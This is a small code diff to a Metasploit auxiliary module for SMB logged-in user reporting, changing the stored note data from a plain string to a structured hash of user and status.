@@ -112,7 +112,10 @@ class MetasploitModule < Msf::Auxiliary
       :sname => 'smb',
       :port => rport,
       :type => 'smb.domain.loggedusers',
-      :data => "#{username} is logged in",
+      :data => {
+        :user => username,
+        :status => "Logged in"
+      },
       :update => :unique_data
     )
   end
